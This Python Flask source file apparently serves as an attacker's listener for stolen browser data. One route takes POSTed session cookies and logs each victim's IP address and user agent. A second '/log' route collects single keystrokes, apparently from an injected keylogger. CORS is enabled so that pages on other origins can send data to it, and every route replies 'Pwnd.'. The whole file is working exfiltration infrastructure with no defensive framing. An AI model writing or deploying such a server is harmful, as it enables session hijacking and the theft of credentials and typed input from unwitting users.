import os

from flask_cors import CORS
from termcolor import colored
from datetime import datetime
from flask import Flask, request

# Initialize Flask App
app = Flask(__name__)
CORS(app)

@app.route("/", methods=["POST"])
def home():
    data = request.get_json()
    # os.system("cls" if os.name == "nt" else "clear")
    print(
        colored("[🕒] ", "green")
        + colored(datetime.now().strftime("%H:%M:%S"), "cyan")
        + colored(" | ", "green")
        + colored(datetime.now().strftime("%d/%m/%Y"), "cyan")
    )
    print(
        colored("[🔗] Received Connection from ", "green")
        + colored(request.remote_addr, "cyan")
    )

    cookie = data["cookie"]

    if len(cookie) >60:
        cookie = cookie[:60] + "..."

    user_agent = request.headers.get("User-Agent")
    print(colored("[📱] User Agent: ", "green") + colored(user_agent, "cyan"))
    print(colored("[🍪] Cookie: ", "green") + colored(data["cookie"], "cyan"))

    return "Pwnd."


@app.route("/log", methods=["POST"])
def log():
    data = request.get_json()
    key = data["key"]
    current_time = datetime.now().strftime("%H:%M:%S")
    os.system("cls" if os.name == "nt" else "clear")
    print(colored(f"[📝] {current_time}\t-\t{key}", "cyan"))

    return "Pwnd."

if __name__ == "__main__":
    app.run("0.0.0.0", debug=False)
